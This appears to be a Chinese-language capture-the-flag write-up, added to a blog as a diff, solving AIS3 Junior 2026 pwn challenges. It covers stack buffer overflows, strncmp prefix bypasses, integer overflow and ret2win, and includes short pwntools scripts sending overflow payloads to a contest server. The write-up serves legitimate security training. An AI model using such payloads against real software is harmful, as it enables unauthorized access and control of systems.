@@ -1,0 +1,383 @@
+---
+title: "AIS3 Junior 2026 Day3 Writeup : Pwn"
+date: "2026-08-06"
+summary: "AIS3 Junior 2026 第三天 Pwn 題解：buffer overflow、strncmp 前綴、整數溢位與 ret2win。"
+category: writeup
+---
+
+## Pwn
+
+### Pwn-1
+
+> 終端機不可打印字元
+
+拿到了一個 pwn01_local.out
+
+![image](https://hackmd.io/_uploads/rkSDHuSUfx.png)
+
+先用 Ghidra 進去看看
+
+![image](https://hackmd.io/_uploads/SJqO8urIfx.png)
+
+這邊分別有調用兩個函式
+
+![image](https://hackmd.io/_uploads/rkznIOrIMg.png)
+
+注意到 get()，這個函式他會一直讀，直到遇到換行符或 EOF 才停
+
+![image](https://hackmd.io/_uploads/Bk9TUdHLfl.png)
+
+main 函式的 is_admin 跟 password 變數相鄰
+password 字串有 24 bytes
+is_admin 是 int 所以佔 4 bytes
+
+![image](https://hackmd.io/_uploads/rkcsAcS8fx.png)
+
+點進 password 會看到組合語言那邊有
+`CMP dword ptr [RBP + is_admin], 0xcafebabe`
+~~雖然不知道為何在右邊 C 沒有~~
+
+![image](https://hackmd.io/_uploads/H1mrzoBUfx.png)
+
+只要讓 is_admin 等於 `0xcafebabe` 就能通過
+原則上，is_admin 是無法被操作到的，因為要 password 那關過了才會變動
+但是前面有提到，get() 沒有長度限制，超出 24 Bytes 時，就會從 password 溢位到 is_admin
+
+結論是 password 隨便填充 24 個 Bytes，後面的四個 Bytes 填入等價 0xcafebabe 的東西就行
+
+0xcafebabe 是一個 32-bit (4 bytes) 的十六進位數字
+x86-64 指令集的特性是倒著存
+所以要先把 0xcafebabe 拆成 4 個 byte，再反著排
+
+最後寫個 py
+
+```python
+from pwn import *
+
+p = remote('165.154.226.158', 11037)
+payload = b'A' * 24 + p32(0xcafebabe)
+p.sendline(payload)
+p.interactive()
+```
+
+先 `nc 165.154.226.158 11037`
+然後執行一下就能得到 flag
+
+![image](https://hackmd.io/_uploads/HJoYYjBUfx.png)
+
+*我因為順便學習一下所以寫的比較多*
+
+### Pwn-2
+
+> 看起來不難 (?
+
+![image](https://hackmd.io/_uploads/rkDoMb88fe.png)
+
+![image](https://hackmd.io/_uploads/S1Mi7WI8Gx.png)
+
+main 那邊沒啥東西，去用指令查找看看
+
+![image](https://hackmd.io/_uploads/ryS4Hb8LMg.png)
+
+過去那邊的位址
+
+![image](https://hackmd.io/_uploads/BJuPB-LLzg.png)
+
+main 函式
+
+```
+0000000000401170 <main>:
+  401170: endbr64
+  401174: push   rbp
+  401175: mov    rbp,rsp
+  401178: sub    rsp,0x20              ;  32 bytes 空間給 buf
+  40117c: lea    rax,[rip+0xe91]
+  401183: mov    rdi,rax
+  401186: call   puts
+  40118b: lea    rax,[rbp-0x20]        ; buf 起始位址 = rbp-0x20
+  40118f: mov    rdi,rax
+  401192: mov    eax,0x0
+  401197: call   gets                   ; 無長度限制
+  40119c: mov    eax,0x0
+  4011a1: leave
+  4011a2: ret
+```
+
+32 (char buf [32]) + 8 (saved RBP 佔用的空間) = 40 bytes 垃圾字元，接著 8 bytes 的 win 位址
+就可以蓋過去
+
+![image](https://hackmd.io/_uploads/SJ5OtZ8Lzx.png)
+
+## HW
+
+### Pwn-HW-01
+
+> 這次是跟字串處理有關
+
+![image](https://hackmd.io/_uploads/Sk9_B2HUMg.png)
+
+![image](https://hackmd.io/_uploads/Sk2yPhHUfx.png)
+
+看到 C 那邊有
+
+```
+sVar3 = strlen((char)local_58);      // 輸入字串的長度
+iVar1 = (int)sVar3;
+...
+else if (iVar1 < (int)sVar2) {        // 輸入長度 < "VIP_ACCESS_TICKET" 的長度
+    iVar1 = strncmp((char)local_58, "VIP_ACCESS_TICKET", (long)iVar1); // 比對字串，這是輸入長度而非密碼長度
+    if (iVar1 == 0) {
+        puts("Welcome, VIP!");
+        puts("AIS3{fake_flag_hw1}");   // 過關印 flag
+    }
+```
+
+strncmp(s1, s2, n) 用來比較 s1 跟 s2 的前 n 個字元是否完全相同，相同就回傳 0
+
+strncmp 第三個參數是 iVar1，也就是代表輸入的字串長度，不是寫死的 18 (與 VIP 相同的長度)，所以只要輸入的內容是密碼的前綴，不管多短都能過
+
+結論是輸入只要是 VIP 那串的前綴且小於/不等於 18 就行
+
+甚至只要輸入一個 V 就能取得 flag 了
+
+![image](https://hackmd.io/_uploads/S1RPj2SLMl.png)
+
+### Pwn-HW-02
+
+![image](https://hackmd.io/_uploads/rk3x32rIMl.png)
+
+第一眼沒看出東西
+
+![image](https://hackmd.io/_uploads/HJqF2hrIzx.png)
+
+發現開頭宣告的一整坨變數很 SUS，尤其下面的排在一起，並且在組合語言那邊還有 bytes 之類的東西
+
+查了一下，`MOV BYTE PTR` 那是將 bytes 從指定的記憶體地址移動到寄存器中
+
+![image](https://hackmd.io/_uploads/B18VA2SUze.png)
+
+code 整個邏輯大概長這樣
+
+```
+scanf 讀輸入 → 去掉換行符
+if (輸入 == "很長的假密碼")
+    puts("帳號已鎖定");
+else if (輸入 == "真密碼!")
+    puts("正確!");
+    puts("AIS3{fake_hw02__________}");
+else
+    puts("錯誤!");
+```
+
+*看不太懂組語*
+
+把他轉換一下拿到真密碼
+
+`0x70 0x77 0x6e 0x6d 0x33 0x21` → `p w n m 3 !`
+
+得到 flag
+
+![image](https://hackmd.io/_uploads/Syo2xTSUzx.png)
+
+### Pwn-HW-03
+
+> "何"溢位
+
+![image](https://hackmd.io/_uploads/rkK4zaSLMl.png)
+
+![image](https://hackmd.io/_uploads/rkjFMarIfe.png)
+
+code 其中的 total = n * 10 是用 32 位元有號整數運算的
+當 n 很大時，n*10 會超過 32-bit 整數能表示的範圍 (正負 21 億多)，發生整數溢位時，會繞回來變成一個很小甚至是負數的值 (正整數 32 位元的溢位會從負的 21 億多開始跑)
+
+還原一下邏輯
+
+```
+scanf("%d", &n);
+if (n <= 0) fail("Need a positive number.");
+
+total = n * 10;
+
+if (total <= 1000)
+    puts("Order accepted.");
+    if (n > 99999)
+        puts("Prize unlocked!");
+        puts("AIS3{fake_hw03__________}");
+    else
+        puts("Too small for the prize.");
+else
+    puts("Denied.");
+```
+
+只要同時滿足下面的條件就能繞過
+
+1. n > 0 (通過第一關)
+2. n > 99999 (要拿獎品的條件)
+3. 算出的 n * 10 (用 32-bit 溢位後) 要 <= 1000
+
+用 nc 連接網站
+
+![image](https://hackmd.io/_uploads/B1-UE6BIMl.png)
+
+他問我要多少，輸入 32 位的 limit 即可
+
+`2147483647`
+
+![image](https://hackmd.io/_uploads/BJ0kBpBLMx.png)
+
+### Pwn-HW-04
+
+![image](https://hackmd.io/_uploads/SJefIaBLzg.png)
+
+分析一下 (這次應該可以直接看 C 就好不用看組語)
+
+![image](https://hackmd.io/_uploads/rJvWLaBLzx.png)
+
+s 是一個 40 bytes 的結構，裡面包含了 `s.buf` 輸入緩衝區、`s.unlocked` 第一個開關、`s.is_admin` 第二個開關
+
+兩個開關會先被初始化
+
+印出提示輸入東西，gets 沒有長度限制，輸入多少就往 `s.buf` 往後塞多少
+
+```
+puts("stage1>");
+gets(s.buf);
+```
+
+檢查 `s.unlocked` 是不是等於 1
+因為 gets 沒有邊界檢查，如果輸入的長度夠長，會蓋過 `s.buf` 的範圍，一路寫到 `s.unlocked` 那邊，所以可以直接用輸入內容，把 `s.unlocked` 蓋成 1 來繞過
+
+`if (s.unlocked == 1) {`
+
+過了第一部分才會走到這裡，同樣是印提示、同樣呼叫 gets 再讀一次
+這裡的重點是，它又是從 `s.buf` 這個位置開始寫，跟第一次讀的起點是同一個地方
+
+```
+puts("stage2>");
+gets(s.buf);
+```
+
+檢查 `s.is_admin` 是否等於 `-0x21524111` (換算成十六進位無號值就是 0xdeadbeef)
+同理，第二次 gets 只要輸入夠長，就能蓋過 `s.is_admin` 的記憶體位置而成任意值
+
+`if (s.is_admin == -0x21524111) {`
+
+兩關都對才印 flag，任何條件沒達成就會印失敗訊息
+
+```
+puts("AIS3{fake_flag_hw4}");
+} else {
+    puts("not admin");
+}
+} else {
+    puts("still locked");
+}
+```
+
+*簡單講就是用 gets 分別對兩個關卡溢位*
+
+stage1 輸入 32 個垃圾字元 + 4 bytes 的數字 1
+
+stage2 輸入 36 個垃圾字元 + 4 bytes 的 0xdeadbeef
+
+要記得因為是 x86_64，所以 Stack 那邊會反過來
+
+![image](https://hackmd.io/_uploads/Ski1gAB8fx.png)
+
+### Pwn-HW-05
+
+![image](https://hackmd.io/_uploads/SJuhgRB8zl.png)
+
+![image](https://hackmd.io/_uploads/HJG2eCS8fx.png)
+
+點進 check_token 那邊看看
+
+![image](https://hackmd.io/_uploads/SJsq-CHIzx.png)
+
+還原長這樣
+
+```c
+int check_token(void) {
+    char token[64] = {0};   // 初始化 token 陣列
+
+    printf("Token: ");
+    fflush(stdout);
+
+    if (scanf("%63s", token) == 1) {          // 讀取輸入
+        if (strlen(token) == 0) {
+            return 0;                          // 空字串, 失敗
+        }
+        // 用輸入的長度去比對，而非密碼的固定長度
+        if (strncmp(token, "OPEN_SESAME_PLEASE", strlen(token)) == 0) {
+            return 1;   // 成功
+        } else {
+            return 0;   // 失敗
+        }
+    } else {
+        return 0;
+    }
+}
+```
+
+與 **HW-01 跟 Pwn-02** 差不多的手法
+strncmp 第三個參數用的是 strlen(token)，輸入是看長度而非密碼
+也是只需要輸入 `OPEN_SESAME_PLEASE` 的前綴就能過關，不用打完整字串
+比較大的不同在於長度沒有限制必須小於密碼長度
+
+第一關雖然沒限制長度但以防萬一還是直接用 `OPEN_SESAME_PLEASE`
+第二道門用 40 個垃圾字元 + 8 bytes 的 win() 位址
+
+拿到 flag
+
+![image](https://hackmd.io/_uploads/H1f4WW8IGx.png)
+
+### Pwn-HW-06
+
+![image](https://hackmd.io/_uploads/rJ8_9-IUzx.png)
+
+![image](https://hackmd.io/_uploads/Syl0q-U8Gl.png)
+
+似乎直接看 main 就行了
+簡化後長這樣
+
+```
+int price = 1,000,000,000; // 價格
+int n;                     // 座位數量
+
+if (n <= 0) fail("Need a positive number.");
+
+int total = n * price;     // 座位數量 x 價格 = 總價格
+
+if (total > 99 && total <= 5000) fail("Too expensive / weird total.");
+if (total <= 99) call vault();
+else fail("Booking rejected.");
+```
+
+price = 1,000,000,000，已經快接近 32 位元的極限了，n 如果大於 3 就會溢位
+
+total <= 99，會直接跳過中間對於太貴的判斷，進入 vault()
+
+![image](https://hackmd.io/_uploads/r1hYnWLLfe.png)
+
+32 (note 大小) + 8 (saved RBP) = 40 bytes
+接著 8 bytes 填入 win() 位址
+
+`exploit.py`
+
+```python
+from pwn import *
+
+p = remote('165.154.226.158', 11044)
+
+p.sendlineafter(b'): ', b'3')
+
+win_addr = 0x4011d6
+payload = b'A' * 40 + p64(win_addr)
+p.sendlineafter(b'note:', payload)
+
+p.interactive()
+```
+
+取得 flag
+
+![image](https://hackmd.io/_uploads/Hk4k0WILGx.png)
